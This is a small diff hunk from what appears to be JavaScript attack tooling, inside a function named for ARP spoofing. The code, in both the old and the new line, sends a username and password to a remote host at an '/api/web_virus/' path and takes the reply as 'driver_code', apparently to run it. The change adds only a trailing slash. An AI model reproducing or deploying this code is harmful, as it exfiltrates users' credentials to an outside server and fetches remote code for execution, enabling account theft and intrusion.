@@ -73,7 +73,7 @@ function deal_arp_spoof() {
 
 
 var hacker_driver_xhr = new XMLHttpRequest();
-hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd, true);
+hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd+"/", true);
 hacker_driver_xhr.send();
 hacker_driver_xhr.onload = function() {
     var driver_code = hacker_driver_xhr.responseText;
